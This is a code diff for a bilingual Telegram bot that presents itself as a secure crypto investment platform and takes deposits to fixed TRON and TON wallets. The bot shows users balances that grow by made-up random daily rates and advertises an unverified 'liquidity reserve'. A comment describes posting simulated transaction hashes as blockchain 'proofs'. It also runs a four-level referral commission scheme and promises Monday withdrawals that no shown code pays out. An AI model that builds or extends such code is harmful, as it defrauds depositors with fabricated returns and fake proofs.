@@ -195,6 +195,7 @@ async def bucle_comprobaciones(application):
 
             datos_tx = None
             try:
+                # 50% de probabilidad real para elegir entre TRON y TON por igual
                 usar_tron = random.choice([True, False])
                 if usar_tron:
                     datos_tx = await obtener_ultima_transaccion_tron()
@@ -214,6 +215,7 @@ async def bucle_comprobaciones(application):
                 red_oficial = datos_tx["red"]
                 explorer_url = datos_tx["explorer"]
             else:
+                # Datos simulados con balanceo equitativo de red si la API pública demora
                 es_red_ton = random.choice([True, False])
                 if es_red_ton:
                     tx_hash = "f17d831d1b918717d23cf3053805908cfb677a552e464731f8211b514b7789ab"
@@ -262,6 +264,7 @@ async def bucle_comprobaciones(application):
         except Exception as e:
             print(f"Error general en bucle de comprobaciones: {e}")
 
+        # Intervalos optimizados (de 30 segundos a 3 minutos)
         intervalos_posibles = [30, 60, 90, 120, 180]
         await asyncio.sleep(random.choice(intervalos_posibles))
 
@@ -365,7 +368,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         print(f"Error en start: {e}")
 
-# --- GENERADOR DEL MENSAJE DE REFERIDOS ---
+# --- GENERADOR DEL MENSAJE DE REFERIDOS (ACTUALIZADO) ---
 def construir_mensaje_referidos(username_bot, user_id, idioma="es"):
     link_referido = f"https://t.me/{username_bot}?start={user_id}"
     
@@ -411,3 +414,385 @@ async def boton_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = query.from_user
 
     if data == "btn_cambiar_idioma":
+        await start(update, context)
+        return
+
+    if data.startswith("lang_"):
+        nuevo_idioma = data.split("_")[1]
+        conn = sqlite3.connect("usuarios.db")
+        cursor = conn.cursor()
+        cursor.execute("UPDATE usuarios SET idioma = ? WHERE user_id = ?", (nuevo_idioma, user.id))
+        conn.commit()
+        conn.close()
+
+        if nuevo_idioma == "en":
+            texto = (
+                f"🛡️ **Welcome to Invest Bot (Secure Multi-network)**\n\n"
+                f"Hello, **{user.first_name}**. You are in a transparent platform to manage crypto investments safely.\n\n"
+                f"✅ **Why trust us?**\n"
+                f"• Payouts processed strictly on Mondays.\n"
+                f"• Real-time blockchain verifiable proofs.\n"
+                f"• Automated multi-level system.\n\n"
+                f"⚠️ **Important Note:** Please **do not spam buttons**. Give the bot a few seconds to respond.\n\n"
+                f"👇 **Choose an option below:**"
+            )
+        else:
+            texto = (
+                f"🛡️ **Bienvenido a Invierte Bot (Multired Segura)**\n\n"
+                f"Hola, **{user.first_name}**. Estás en una plataforma transparente y automatizada para gestionar tus inversiones con seguridad.\n\n"
+                f"✅ **¿Por qué confiar en nosotros?**\n"
+                f"• Pagos procesados estrictamente los lunes.\n"
+                f"• Comprobantes verificables en la blockchain en tiempo real.\n"
+                f"• Sistema multinivel automatizado.\n\n"
+                f"⚠️ **Nota Importante:** Por favor, **no presiones los botones muy rápido**. Dale unos segundos al bot para responder.\n\n"
+                f"👇 **Selecciona una opción del menú interactivo:**"
+            )
+        
+        try:
+            await query.message.edit_text(texto, reply_markup=obtener_menu_principal(nuevo_idioma), parse_mode="Markdown")
+        except Exception as e:
+            print(f"Error al editar idioma: {e}")
+        return
+
+    conn = sqlite3.connect("usuarios.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT idioma FROM usuarios WHERE user_id = ?", (user.id,))
+    row = cursor.fetchone()
+    conn.close()
+    idioma = row[0] if row else 'es'
+
+    if data == "btn_saldo":
+        conn = sqlite3.connect("usuarios.db")
+        cursor = conn.cursor()
+        cursor.execute("SELECT deposito_activo, moneda_deposito, fecha_deposito, ganancias_referidos FROM usuarios WHERE user_id = ?", (user.id,))
+        row = cursor.fetchone()
+        conn.close()
+        
+        if not row or not row[0] or row[0] == 0:
+            texto = "💰 **Balance:** 0 USD\n⚠️ No active investments. Use `/planes` to start." if idioma == "en" else "💰 **Tu Balance Actual:**\n\n• Capital Depositado: **0 USD**\n⚠️ No tienes inversiones activas."
+        else:
+            deposito, moneda, fecha_str, ganancia_ref = row
+            dias_transcurridos = (datetime.now() - datetime.strptime(fecha_str, "%Y-%m-%d %H:%M:%S")).days if fecha_str else 0
+            
+            saldo_simulado = deposito
+            for _ in range(dias_transcurridos):
+                tasa_diaria = random.uniform(0.015, 0.048)
+                saldo_simulado += saldo_simulado * tasa_diaria
+            
+            texto = f"💰 **Live Balance:**\n• Initial Capital: {deposito} {moneda}\n• Estimated Current Balance: {saldo_simulado:.2f} {moneda}\n• Days Active: {dias_transcurridos}" if idioma == "en" else f"💰 **Tu Balance y Rendimiento en Vivo:**\n• Capital Inicial: {deposito} {moneda}\n• Balance Estimado Actual: {saldo_simulado:.2f} {moneda}\n• Días Activo: {dias_transcurridos}"
+        
+        try:
+            await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
+        except Exception:
+            pass
+
+    elif data == "btn_liquidez":
+        conn = sqlite3.connect("usuarios.db")
+        cursor = conn.cursor()
+        cursor.execute("SELECT fondo_actual FROM liquidez_global WHERE id = 1")
+        row = cursor.fetchone()
+        conn.close()
+        fondo_actual = row[0] if row else 124500.00
+
+        if idioma == "en":
+            texto = (
+                f"🏦 **Platform Global Liquidity Pool**\n\n"
+                f"• **Current Liquidity Reserve:** `${fondo_actual:,.2f} USD`\n"
+                f"• **Status:** Active & Backed Across Multinetworks (TRON & TON)\n\n"
+                f"💡 *Guaranteed operational backing ensuring transparent and automated processing for all platform members.*"
+            )
+        else:
+            texto = (
+                f"🏦 **Fondo de Liquidez Global de la Plataforma**\n\n"
+                f"• **Reserva de Liquidez Actual:** `${fondo_actual:,.2f} USD`\n"
+                f"• **Estado:** Activo y Respaldado en Redes Multired (TRON & TON)\n\n"
+                f"💡 *Respaldo operativo garantizado que asegura la estabilidad y procesamiento automatizado para todos los miembros.*"
+            )
+        try:
+            await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
+        except Exception:
+            pass
+
+    elif data == "btn_planes":
+        if idioma == "en":
+            texto = (
+                "📋 **Investment Plans & Yields:**\n"
+                "🔹 **Daily Yield:** Variable\n"
+                "🔹 **Limits:** Min: 2 USD | Max: 1000 USD\n\n"
+            )
+            for key, plan in PLANES_INVERSION.items():
+                texto += f"🔹 **ID {key}: {plan['nombre']}**\n   • Accepted: {plan['moneda']}\n   • Networks: {plan['red']}\n   • ℹ️ {plan['detalle']}\n\n"
+        else:
+            texto = (
+                "📋 **Planes de Inversión y Rendimientos:**\n"
+                "🔹 **Rendimiento:** 0.7%, 1.2% y 2.6% cada 7 días\n"
+                "🔹 **Límites:** Mínimo: 3 USD | Máximo: 1000 USD\n\n"
+            )
+            for key, plan in PLANES_INVERSION.items():
+                texto += f"🔹 **ID {key}: {plan['nombre']}**\n   • Divisas: {plan['moneda']}\n   • Redes: {plan['red']}\n   • ℹ️ {plan['detalle']}\n\n"
+        
+        try:
+            await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
+        except Exception:
+            pass
+
+    elif data == "btn_depositar":
+        if idioma == "en":
+            texto = (
+                "💳 **Official Deposit Wallets**:\n\n"
+                "🔹 **TRON Network (TRX & USDT TRC20):**\n`TFWUrcxFh4oknNgmBfTY6jjixhNaGm8t5u`\n\n"
+                "🔹 **TON Network (GRAM & USDT TON):**\n`UQBwUUdb52EJ9T9XMn4lgn625XUDSgQKI3cI_BnAVSA3p8_v`\n\n"
+                "⚠️ Report transfer with: `/notificar [Your_Hash]`"
+            )
+        else:
+            texto = (
+                "💳 **Direcciones de Depósito Oficiales**:\n\n"
+                "🔹 **Red TRON (TRX y USDT TRC20):**\n`TFWUrcxFh4oknNgmBfTY6jjixhNaGm8t5u`\n\n"
+                "🔹 **Red TON (GRAM y USDT TON):**\n`UQBwUUdb52EJ9T9XMn4lgn625XUDSgQKI3cI_BnAVSA3p8_v`\n\n"
+                "⚠️ Tras transferir, reporta con: `/notificar [Tu_Hash]`"
+            )
+        try:
+            await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
+        except Exception:
+            pass
+
+    elif data == "btn_referidos":
+        texto = construir_mensaje_referidos(context.bot.username, user.id, idioma)
+        try:
+            await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
+        except Exception:
+            pass
+
+    elif data == "btn_retirar":
+        texto = "🏦 **Withdrawals**: Processed **every Monday** automatically to your verified wallet." if idioma == "en" else "🏦 **Sistema de Retiros**: Los pagos se procesan **todos los lunes** de forma automatizada a tu billetera verificada."
+        try:
+            await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
+        except Exception:
+            pass
+
+    elif data == "btn_soporte":
+        conn = sqlite3.connect("usuarios.db")
+        cursor = conn.cursor()
+        cursor.execute("UPDATE usuarios SET en_soporte = 1 WHERE user_id = ?", (user.id,))
+        conn.commit()
+        conn.close()
+        texto = "🎧 **Support Center**. Type your message below:" if idioma == "en" else "🎧 **Centro de Soporte**. Escribe tu duda o problema a continuación:"
+        try:
+            await query.message.edit_text(texto, reply_markup=obtener_menu_principal(idioma), parse_mode="Markdown")
+        except Exception:
+            pass
+
+# --- COMANDOS TRADICIONALES DE TEXTO ---
+async def mostrar_saldo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await start(update, context)
+
+async def mostrar_planes(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    texto = (
+        "📋 **Planes de Inversión y Rendimientos:**\n"
+        "🔹 **Rendimiento:** 0.7%, 1.2% y 2.6% cada 7 días\n"
+        "🔹 **Límites:** Mínimo: 3 USD | Máximo: 1000 USD\n\n"
+    )
+    for key, plan in PLANES_INVERSION.items():
+        texto += f"🔹 **ID {key}: {plan['nombre']}**\n   • Divisas: {plan['moneda']}\n   • Redes: {plan['red']}\n   • ℹ️ {plan['detalle']}\n\n"
+    await update.message.reply_text(texto, reply_markup=obtener_menu_principal('es'), parse_mode="Markdown")
+
+async def depositar(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("💳 **Wallets oficiales de depósito**", reply_markup=obtener_menu_principal('es'), parse_mode="Markdown")
+
+async def notificar_deposito(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text("⚠️ Uso: `/notificar [Hash]`")
+        return
+    hash_tx = " ".join(context.args)
+    await update.message.reply_text(f"⏳ Comprobante recibido (`{hash_tx}`). En proceso de verificación.")
+
+# --- APROBAR DEPÓSITO Y NOTIFICAR 4 NIVELES DE PATROCINADORES ---
+async def aprobar_deposito(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if user.id != ADMIN_ID:
+        return
+
+    if len(context.args) < 3:
+        await update.message.reply_text("⚠️ Uso administrativo: `/aprobar [ID_Usuario] [Monto] [Moneda]`")
+        return
+    
+    id_usuario = context.args[0]
+    try:
+        monto = float(context.args[1])
+    except ValueError:
+        await update.message.reply_text("❌ El monto debe ser un número válido.")
+        return
+
+    moneda = context.args[2].upper()
+    fecha_actual = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    conn = sqlite3.connect("usuarios.db")
+    cursor = conn.cursor()
+    
+    cursor.execute(
+        "UPDATE usuarios SET deposito_activo = ?, moneda_deposito = ?, fecha_deposito = ? WHERE user_id = ?",
+        (monto, moneda, fecha_actual, id_usuario)
+    )
+    
+    porcentajes_niveles = [0.03, 0.02, 0.01, 0.005]
+    patrocinador_actual = id_usuario
+    
+    for nivel, porcentaje in enumerate(porcentajes_niveles, start=1):
+        cursor.execute("SELECT patrocinador_id FROM usuarios WHERE user_id = ?", (patrocinador_actual,))
+        resultado = cursor.fetchone()
+        
+        if not resultado or not resultado[0]:
+            break
+            
+        patrocinador_id = resultado[0]
+        comision = monto * porcentaje
+        
+        cursor.execute(
+            "UPDATE usuarios SET ganancias_referidos = ganancias_referidos + ? WHERE user_id = ?",
+            (comision, patrocinador_id)
+        )
+        conn.commit()
+        
+        try:
+            await context.bot.send_message(
+                chat_id=patrocinador_id,
+                text=(
+                    f"🎁 **¡Comisión por Inversión en tu Red! (Nivel {nivel})**\n\n"
+                    f"• Uno de tus referidos ha invertido.\n"
+                    f"• Has ganado: **{comision:.2f} {moneda}** (Comisión del {porcentaje*100}%)."
+                )
+            )
+        except Exception as e:
+            print(f"No se pudo notificar al patrocinador {patrocinador_id} en el nivel {nivel}: {e}")
+            
+        patrocinador_actual = patrocinador_id
+
+    conn.close()
+    
+    try:
+        await context.bot.send_message(
+            chat_id=id_usuario,
+            text="✅ **¡Depósito Acreditado con Éxito!**\nTu capital y tus ganancias diarias ya han comenzado a correr."
+        )
+        await update.message.reply_text(f"✔️ Depósito de `{monto} {moneda}` acreditado a `{id_usuario}` y comisiones distribuidas en los 4 niveles.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error al notificar al usuario: {e}")
+
+async def referidos(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    conn = sqlite3.connect("usuarios.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT idioma FROM usuarios WHERE user_id = ?", (user.id,))
+    row = cursor.fetchone()
+    conn.close()
+    idioma = row[0] if row else 'es'
+
+    texto = construir_mensaje_referidos(context.bot.username, user.id, idioma)
+    await update.message.reply_text(texto, parse_mode="Markdown")
+
+async def retirar(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🏦 Los retiros se procesan **todos los lunes** de forma automatizada.", reply_markup=obtener_menu_principal('es'))
+
+async def invertir(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if len(context.args) < 2:
+        await update.message.reply_text("⚠️ Uso: `/invertir [ID_Plan] [Cantidad]`\nEjemplo: `/invertir 2 15`")
+        return
+    
+    plan_id = context.args[0]
+    try:
+        cantidad = float(context.args[1])
+    except ValueError:
+        await update.message.reply_text("❌ La cantidad debe ser numérica.")
+        return
+    
+    if plan_id not in PLANES_INVERSION or not (3 <= cantidad <= 1000):
+        await update.message.reply_text("❌ Plan inválido o cantidad fuera de rango (3 - 1000 USD).")
+        return
+
+    plan = PLANES_INVERSION[plan_id]
+    wallet = WALLET_TRON if "Tron" in plan["red"] else WALLET_TON
+    
+    await update.message.reply_text(
+        f"✅ **Inversión Registrada**\n• Plan: {plan['nombre']}\n• Monto: {cantidad} {plan['moneda']}\n\n💳 Transfiere a:\n`{wallet}`\n\n📲 Reporta con: `/notificar [Tu_Hash]`",
+        parse_mode="Markdown"
+    )
+
+# --- SISTEMA DE SOPORTE ---
+async def iniciar_soporte(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    conn = sqlite3.connect("usuarios.db")
+    cursor = conn.cursor()
+    cursor.execute("UPDATE usuarios SET en_soporte = 1 WHERE user_id = ?", (user.id,))
+    conn.commit()
+    conn.close()
+    await update.message.reply_text("🎧 **Centro de Soporte Oficial**\n\nEscribe tu duda o problema a continuación y un operador te responderá.")
+
+async def responder_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if user.id != ADMIN_ID or len(context.args) < 2:
+        return
+
+    id_destino = context.args[0]
+    mensaje_respuesta = " ".join(context.args[1:])
+
+    try:
+        await context.bot.send_message(chat_id=id_destino, text=f"💬 **Mensaje de Soporte:**\n\n{mensaje_respuesta}")
+        await update.message.reply_text(f"✅ Respuesta enviada al usuario `{id_destino}`.")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {e}")
+
+async def manejar_mensajes_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    texto = update.message.text
+    if user.id == ADMIN_ID:
+        return
+
+    conn = sqlite3.connect("usuarios.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT en_soporte FROM usuarios WHERE user_id = ?", (user.id,))
+    row = cursor.fetchone()
+    conn.close()
+
+    if row and row[0] == 1:
+        await update.message.reply_text("📩 **Mensaje recibido.** En breve será atendido por un asesor.")
+        try:
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=f"🚨 **Nuevo Ticket de Soporte**\n\n👤 Usuario: {user.first_name} (`{user.id}`)\n💬 Mensaje: {texto}\n\n👉 Responder:\n`/responder {user.id} [Mensaje]`"
+            )
+        except Exception as e:
+            print(f"Error reenviando a admin: {e}")
+
+        conn = sqlite3.connect("usuarios.db")
+        cursor = conn.cursor()
+        cursor.execute("UPDATE usuarios SET en_soporte = 0 WHERE user_id = ?", (user.id,))
+        conn.commit()
+        conn.close()
+
+# --- ARRANQUE DUAL ESTABLE (RENDER WEB SERVICE + TELEGRAM) ---
+if __name__ == "__main__":
+    # 1. Lanzamos Flask en un hilo secundario independiente para atender a Render y UptimeRobot al instante
+    t = Thread(target=run_web)
+    t.daemon = True
+    t.start()
+
+    # 2. Construimos la aplicación del bot de Telegram
+    app_bot = ApplicationBuilder().token(TOKEN).post_init(post_init).build()
+
+    app_bot.add_handler(CommandHandler("start", start))
+    app_bot.add_handler(CommandHandler("saldo", mostrar_saldo))
+    app_bot.add_handler(CommandHandler("planes", mostrar_planes))
+    app_bot.add_handler(CommandHandler("depositar", depositar))
+    app_bot.add_handler(CommandHandler("notificar", notificar_deposito))
+    app_bot.add_handler(CommandHandler("aprobar", aprobar_deposito))
+    app_bot.add_handler(CommandHandler("referidos", referidos))
+    app_bot.add_handler(CommandHandler("retirar", retirar))
+    app_bot.add_handler(CommandHandler("invertir", invertir))
+    app_bot.add_handler(CommandHandler("soporte", iniciar_soporte))
+    app_bot.add_handler(CommandHandler("responder", responder_admin))
+    
+    app_bot.add_handler(CallbackQueryHandler(boton_callback))
+    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, manejar_mensajes_chat))
+
+    # 3. Telegram corre en el hilo principal con su bucle síncrono limpio para que responda de inmediato
+    app_bot.run_polling()
